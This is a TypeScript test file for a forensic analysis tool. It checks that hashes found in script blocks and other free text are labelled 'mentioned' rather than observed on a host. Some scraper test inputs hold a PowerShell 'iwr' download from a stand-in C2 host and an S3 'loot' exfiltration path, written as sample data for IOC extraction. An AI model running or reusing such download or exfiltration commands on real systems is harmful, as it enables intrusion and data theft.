// #1459: a hash read out of FREE TEXT (a script block, a command line, a message) is a value the
// author wrote down, not a file the collector hashed. INC-2026-028's f12 called a Mimic sample
// "present in the toolkit directory" because `$primaryHash = '<sha256>'` inside an EID 4104 script
// block became a `hash` IOC indistinguishable from a `Hashes: SHA256=…` column. The importer now
// marks such a value `provenance: "mentioned"`; a structured sighting clears the mark at every
// sink and merge seam (plain beats marked, #1266's rule); every consumer that reads a hash as
// "file on host" says "mentioned … no file with this hash was observed" instead.
import { describe, it, expect } from "vitest";
import { parseVelociraptorJson } from "../../src/analysis/velociraptorImport.js";
import { textIocs, type SiemIoc } from "../../src/analysis/siemImport.js";
import { scrapeText } from "../../src/analysis/veloTextIocs.js";
import { addIoc, mergeRowIocs } from "../../src/analysis/iocSink.js";
import { mergeIocs } from "../../src/analysis/iocMerge.js";
import { mergeDelta } from "../../src/analysis/stateMerge.js";
import { deltaSchema, type AnalysisDelta } from "../../src/analysis/responseSchema.js";
import { buildSynthesisContext } from "../../src/analysis/synthSelect.js";
import { scoreIocs } from "../../src/analysis/iocRiskScore.js";
import { isMentionedHash, mentionedHashNote } from "../../src/analysis/iocMentionedHash.js";
import { MENTIONED_LINE, buildStixBundle } from "../../src/reports/stix.js";
import { iocsCsv } from "../../src/reports/csv.js";
import { emptyState, type ForensicEvent, type IOC } from "../../src/analysis/stateTypes.js";
import { parsePlasoCsv } from "../../src/analysis/plasoImport.js";
import { parseCybertriage } from "../../src/analysis/cybertriageImport.js";

const SAMPLE = "a710ed9e0000000000000000000000000000000000000000000000000000beef";
const OTHER = "0b83f2660000000000000000000000000000000000000000000000000000dead";
const SCRIPT = `$primaryHash = '${SAMPLE}'\r\nWrite-Host "staging toolkit"`;

// Windows.Sigma.Base: the parsed 4104 sits under `_Event`, the script under EventData.ScriptBlockText.
function sigmaScriptBlockRow(script = SCRIPT): object {
  return {
    _Source: "Windows.Sigma.Base",
    Level: "high",
    Title: "Suspicious PowerShell Script Block",
    Details: `ScriptBlock: ${script}`,
    _Event: {
      System: {
        EventID: { Value: 4104 },
        Channel: "Microsoft-Windows-PowerShell/Operational",
        Computer: "WS-07",
        TimeCreated: { SystemTime: 1764904070 },
      },
      EventData: { MessageNumber: 1, MessageTotal: 1, ScriptBlockText: script },
    },
  };
}

// Windows.EventLogs.PowershellScriptblock: the script as a flat top-level column, no parsed event.
function flatScriptBlockRow(script = SCRIPT): object {
  return {
    _Source: "Windows.EventLogs.PowershellScriptblock",
    Computer: "WS-07",
    EventTime: "2026-02-10T09:00:00Z",
    EventID: 4104,
    ScriptBlockText: script,
    ScriptBlockId: "5d3c1a8e-0000-4000-8000-000000000001",
  };
}

// A Sysmon EID 1 Sigma row whose collector-computed hash arrives as `Hashes: "SHA256=…"`.
function sysmonHashesRow(sha256 = SAMPLE): object {
  return {
    _Source: "Windows.Detection.Sigma",
    Rule: { Title: "Suspicious Process", Level: "high", Tags: ["attack.t1059.001"] },
    System: {
      EventID: 1,
      Channel: "Microsoft-Windows-Sysmon/Operational",
      Computer: "WS-07",
      TimeCreated: "2026-02-10T09:05:00Z",
    },
    EventData: {
      Image: "C:\\Users\\Public\\toolkit\\Mimic.exe",
      CommandLine: "C:\\Users\\Public\\toolkit\\Mimic.exe -run",
      Hashes: `SHA256=${sha256},MD5=fb118e243e216b84b3838332da8f5665`,
    },
  };
}

// A generic collection row whose SHA256 is its own structured column.
function sha256ColumnRow(sha256 = SAMPLE): object {
  return {
    _Source: "Windows.Forensics.Toolkit",
    Fqdn: "WS-07",
    OSPath: "C:\\Users\\Public\\toolkit\\Mimic.exe",
    SHA256: sha256,
    Mtime: "2026-02-10T09:04:00Z",
  };
}

function hashIoc(iocs: readonly SiemIoc[], value = SAMPLE): SiemIoc | undefined {
  return iocs.find((i) => i.type === "hash" && i.value === value);
}

describe("#1459 -- a hash read from free text is `mentioned`, a structured hash is plain", () => {
  it("a Sigma row's ScriptBlockText mentions the hash", () => {
    const r = parseVelociraptorJson(JSON.stringify([sigmaScriptBlockRow()]));
    expect(hashIoc(r.iocs)).toMatchObject({ type: "hash", value: SAMPLE, provenance: "mentioned" });
  });

  it("a flat PowershellScriptblock row's ScriptBlockText mentions the hash", () => {
    const r = parseVelociraptorJson(JSON.stringify([flatScriptBlockRow()]));
    expect(hashIoc(r.iocs)).toMatchObject({ type: "hash", value: SAMPLE, provenance: "mentioned" });
  });

  it("a Sysmon `Hashes: SHA256=…` column is an observed hash: no provenance", () => {
    const r = parseVelociraptorJson(JSON.stringify([sysmonHashesRow()]));
    const h = hashIoc(r.iocs);
    expect(h).toBeDefined();
    expect(h).not.toHaveProperty("provenance");
  });

  it("a `SHA256` column is an observed hash: no provenance", () => {
    const r = parseVelociraptorJson(JSON.stringify([sha256ColumnRow()]));
    const h = hashIoc(r.iocs);
    expect(h).toBeDefined();
    expect(h).not.toHaveProperty("provenance");
  });

  it("text mention first, structured second: the surviving IOC has no provenance", () => {
    const r = parseVelociraptorJson(JSON.stringify([sigmaScriptBlockRow(), sysmonHashesRow()]));
    const hashes = r.iocs.filter((i) => i.type === "hash" && i.value === SAMPLE);
    expect(hashes).toHaveLength(1);
    expect(hashes[0]).not.toHaveProperty("provenance");
  });

  it("structured first, text mention second: the surviving IOC has no provenance", () => {
    const r = parseVelociraptorJson(JSON.stringify([sha256ColumnRow(), flatScriptBlockRow()]));
    const hashes = r.iocs.filter((i) => i.type === "hash" && i.value === SAMPLE);
    expect(hashes).toHaveLength(1);
    expect(hashes[0]).not.toHaveProperty("provenance");
  });

  it("a hash the script only mentions stays marked when another hash is observed", () => {
    const r = parseVelociraptorJson(JSON.stringify([sigmaScriptBlockRow(), sysmonHashesRow(OTHER)]));
    expect(hashIoc(r.iocs, SAMPLE)?.provenance).toBe("mentioned");
    expect(hashIoc(r.iocs, OTHER)).not.toHaveProperty("provenance");
  });
});

describe("#1459 -- every free-text scraper marks what it reads", () => {
  it("siemImport's textIocs marks every type it scrapes", () => {
    const sink = new Map<string, SiemIoc>();
    textIocs(
      `iwr http://c2.example/a.ps1; ${SAMPLE} from 203.0.113.9 S-1-5-21-1004336348-1177238915-682003330-1107`,
      sink,
    );
    const all = [...sink.values()];
    expect(all.length).toBeGreaterThanOrEqual(4);
    for (const i of all) expect(i.provenance).toBe("mentioned");
  });

  it("veloTextIocs' scrapeText marks every type it scrapes", () => {
    const sink = new Map<string, SiemIoc>();
    scrapeText(`${SCRIPT} CVE-2024-1709 http://c2.example/x 203.0.113.9 s3://loot-bucket/out/`, sink);
    const all = [...sink.values()];
    expect(all.length).toBeGreaterThanOrEqual(4);
    for (const i of all) expect(i.provenance).toBe("mentioned");
  });

  it("a Plaso message's hash is mentioned", () => {
    const header = "datetime,timestamp_desc,source,source_long,message,parser,display_name,tag";
    const row = `2023-08-01T10:00:00.123456+00:00,Content Modification Time,FILE,File entry shell item,"note sha256 ${SAMPLE}",filestat,TSK:/Temp/evil.exe,-`;
    const r = parsePlasoCsv(`${header}\n${row}\n`);
    expect(hashIoc(r.iocs)?.provenance).toBe("mentioned");
  });

  it("a Cyber Triage message's hash is mentioned", () => {
    const r = parseCybertriage(
      JSON.stringify([
        {
          ctType: "File",
          datetime: "2026-01-28T01:47:37",
          hostName: "win11",
          message: `/trigonasim/logs/readme.txt mentions ${SAMPLE}`,
          path: "/trigonasim/logs/readme.txt",
          score: "Notable_Normal",
          timestamp_desc: "File Created",
        },
      ]),
    );
    expect(hashIoc(r.iocs)?.provenance).toBe("mentioned");
  });
});

describe("#1459 -- plain beats `mentioned` at every sink and merge seam", () => {
  it("addIoc: mentioned then plain, and plain then mentioned, both end plain; mentioned twice stays", () => {
    const a = new Map<string, SiemIoc>();
    addIoc(a, "hash", SAMPLE, "mentioned");
    addIoc(a, "hash", SAMPLE);
    expect([...a.values()][0]).not.toHaveProperty("provenance");

    const b = new Map<string, SiemIoc>();
    addIoc(b, "hash", SAMPLE);
    addIoc(b, "hash", SAMPLE, "mentioned");
    expect([...b.values()][0]).not.toHaveProperty("provenance");

    const c = new Map<string, SiemIoc>();
    addIoc(c, "hash", SAMPLE, "mentioned");
    addIoc(c, "hash", SAMPLE, "mentioned");
    expect([...c.values()][0].provenance).toBe("mentioned");
  });

  it("mergeRowIocs: a plain row sighting clears a mentioned file-level one and vice versa", () => {
    const file = new Map<string, SiemIoc>();
    const row1 = new Map<string, SiemIoc>();
    addIoc(row1, "hash", SAMPLE, "mentioned");
    mergeRowIocs(file, row1, "k1");
    expect([...file.values()][0].provenance).toBe("mentioned");
    const row2 = new Map<string, SiemIoc>();
    addIoc(row2, "hash", SAMPLE);
    mergeRowIocs(file, row2, "k2");
    expect([...file.values()][0]).not.toHaveProperty("provenance");
    expect([...file.values()][0].sourceAggKeys).toEqual(["k1", "k2"]);

    const file2 = new Map<string, SiemIoc>();
    mergeRowIocs(file2, row2, "k2");
    mergeRowIocs(file2, row1, "k1");
    expect([...file2.values()][0]).not.toHaveProperty("provenance");
  });

  it("mergeIocs: an event-linked plain duplicate clears a mentioned canonical; a mentioned duplicate never marks", () => {
    const at = "2026-01-01T00:00:00Z";
    const s = emptyState("c1");
    s.iocs.push(
      { id: "a", type: "hash", value: SAMPLE, firstSeen: at, provenance: "mentioned" },
      { id: "b", type: "hash", value: SAMPLE.toUpperCase(), firstSeen: at, extractedFrom: ["e1"] },
    );
    expect(mergeIocs(s, "b", "a").into).not.toHaveProperty("provenance");

    const t = emptyState("c1");
    t.iocs.push(
      { id: "a", type: "hash", value: SAMPLE, firstSeen: at },
      { id: "b", type: "hash", value: SAMPLE.toUpperCase(), firstSeen: at, provenance: "mentioned" },
    );
    expect(mergeIocs(t, "b", "a").into).not.toHaveProperty("provenance");
  });

  it("mergeDelta: persists the mark, clears it on an event-linked plain sighting, never marks a plain IOC", () => {
    const ctx = { windowSequence: 1, timestamp: "2026-05-28T10:00:00.000Z", sourceScreenshots: [] };
    const base: AnalysisDelta = {
      findings: [],
      iocs: [],
      mitreTechniques: [],
      threadsOpened: [],
      threadsClosed: [],
      timelineNote: "",
      summary: "",
    };
    const marked = { id: "i1", type: "hash" as const, value: SAMPLE, provenance: "mentioned" as const };
    const plainLinked = { id: "i9", type: "hash" as const, value: SAMPLE, extractedFrom: ["ev-1"] };

    const s1 = mergeDelta(emptyState("c1"), { ...base, iocs: [marked] }, ctx);
    expect(s1.iocs[0].provenance).toBe("mentioned");
    const s2 = mergeDelta(s1, { ...base, iocs: [plainLinked] }, { ...ctx, windowSequence: 2 });
    expect(s2.iocs).toHaveLength(1);
    expect(s2.iocs[0]).not.toHaveProperty("provenance");

    const t1 = mergeDelta(emptyState("c1"), { ...base, iocs: [plainLinked] }, ctx);
    const t2 = mergeDelta(t1, { ...base, iocs: [marked] }, { ...ctx, windowSequence: 2 });
    expect(t2.iocs).toHaveLength(1);
    expect(t2.iocs[0]).not.toHaveProperty("provenance");
  });

  it("responseSchema accepts `mentioned` (importers write it through the delta)", () => {
    const parsed = deltaSchema.parse({
      findings: [],
      iocs: [{ id: "i1", type: "hash", value: SAMPLE, provenance: "mentioned" }],
      mitreTechniques: [],
      threadsOpened: [],
      threadsClosed: [],
      timelineNote: "",
      summary: "",
    });
    expect(parsed.iocs[0].provenance).toBe("mentioned");
  });
});

const EVENT_TEXT = `Velociraptor Sigma: Suspicious PowerShell Script Block - $primaryHash = '${SAMPLE}'`;

function mentionedCase(): { state: ReturnType<typeof emptyState>; ioc: IOC; event: ForensicEvent } {
  const state = emptyState("c1");
  const ioc: IOC = {
    id: "i1",
    type: "hash",
    value: SAMPLE,
    firstSeen: "2026-02-10T09:00:00Z",
    provenance: "mentioned",
    extractedFrom: ["e1"],
    enrichments: [{ source: "MalQuery", verdict: "malicious", score: "", fetchedAt: "2026-02-11T00:00:00Z" }],
  };
  const event: ForensicEvent = {
    id: "e1",
    timestamp: "2026-02-10T09:00:00Z",
    description: EVENT_TEXT,
    severity: "Critical",
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    asset: "WS-07",
  };
  state.iocs.push(ioc);
  state.forensicTimeline.push(event);
  return { state, ioc, event };
}

describe("#1459 -- consumers read a mentioned hash as a mention, not a file on the host", () => {
  it("isMentionedHash is true only for a hash marked mentioned", () => {
    expect(isMentionedHash({ type: "hash", provenance: "mentioned" })).toBe(true);
    expect(isMentionedHash({ type: "hash" })).toBe(false);
    expect(isMentionedHash({ type: "hash", provenance: "client-reported" })).toBe(false);
    expect(isMentionedHash({ type: "ip", provenance: "mentioned" })).toBe(false);
  });

  it("mentionedHashNote quotes the event text and says no file was observed", () => {
    const { ioc, event } = mentionedCase();
    const note = mentionedHashNote(ioc, [event]);
    expect(note).toMatch(/^mentioned in .*; no file with this hash was observed$/);
    expect(note).toContain("$primaryHash");
    // No extractedFrom: falls back to the event whose text carries the value.
    const { extractedFrom: _e, ...unlinked } = ioc;
    expect(mentionedHashNote(unlinked, [event])).toContain("$primaryHash");
    // No event at all: still says what matters.
    expect(mentionedHashNote(unlinked, [])).toBe(
      "mentioned in free text (no source event in scope); no file with this hash was observed",
    );
    // A plain hash gets no note.
    expect(mentionedHashNote({ type: "hash", value: SAMPLE }, [event])).toBe("");
  });

  it("the synthesis IOC context says `mentioned in <event text>; no file with this hash was observed` and never [corroborated]", () => {
    const { state } = mentionedCase();
    const ctx = buildSynthesisContext(state, state.forensicTimeline);
    expect(ctx).toContain("THREAT-INTEL VERDICTS");
    expect(ctx).toContain(`${SAMPLE} = malicious (MalQuery)`);
    expect(ctx).toContain("mentioned in ");
    expect(ctx).toContain("$primaryHash");
    expect(ctx).toContain("; no file with this hash was observed");
    // The block's legend still explains [corroborated]; the verdict LINE must not carry it.
    expect(ctx).not.toMatch(new RegExp(`${SAMPLE} = malicious \\(MalQuery\\) \\[corroborated`));
    expect(ctx).toMatch(new RegExp(`${SAMPLE} = malicious \\(MalQuery\\) \\[lone-intel`));
  });

  it("the same hash from a structured column still reads [corroborated] (the control)", () => {
    const { state } = mentionedCase();
    const { provenance: _p, ...plain } = state.iocs[0];
    state.iocs[0] = plain;
    const ctx = buildSynthesisContext(state, state.forensicTimeline);
    expect(ctx).toMatch(new RegExp(`${SAMPLE} = malicious \\(MalQuery\\) \\[corroborated`));
    expect(ctx).not.toContain("no file with this hash was observed");
  });

  it("the composite risk score never counts a mentioned hash as corroborated and says why", () => {
    const { state } = mentionedCase();
    const risk = scoreIocs(state.iocs, state.forensicTimeline, { hostNames: new Set() })["i1"];
    expect(risk.factors.join(" | ")).not.toMatch(/carried by a Medium\+ event|corroborated/);
    expect(risk.factors.join(" | ")).toContain("no file with this hash was observed");
    // #1474: the Critical script block that carries the hash MENTIONS it — no points from it.
    // lone-intel (2) only = 2 → medium; the factor keeps the fact without the credit.
    expect(risk.score).toBe("medium");
    expect(risk.factors).toContain("mentioned in a Critical event");
    expect(risk.factors.join(" | ")).not.toMatch(/seen in|observed by/);
  });

  it("a STIX indicator carries a `mentioned` label, custom property and leading description line", () => {
    const state = emptyState("c1");
    state.iocs.push(
      { id: "i1", type: "hash", value: SAMPLE, firstSeen: "t0", provenance: "mentioned" },
      { id: "i2", type: "hash", value: OTHER, firstSeen: "t0" },
    );
    const inds = buildStixBundle(state).objects.filter((o) => o.type === "indicator");
    const marked = inds.find((o) => o.name === SAMPLE)!;
    const plain = inds.find((o) => o.name === OTHER)!;
    expect(marked.labels).toEqual(["mentioned"]);
    expect(marked.x_dfir_companion_provenance).toBe("mentioned");
    expect(String(marked.description).startsWith(MENTIONED_LINE)).toBe(true);
    expect(MENTIONED_LINE).toContain("free text");
    expect(plain.labels).toBeUndefined();
    expect(plain.x_dfir_companion_provenance).toBeUndefined();
  });

  it("the IOC CSV's provenance column reads `mentioned`", () => {
    const state = emptyState("c1");
    state.iocs.push({ id: "i1", type: "hash", value: SAMPLE, firstSeen: "t0", provenance: "mentioned" });
    const rows = iocsCsv(state).trim().split("\n");
    expect(rows[1].split(",").at(-1)).toBe('"mentioned"');
  });
});
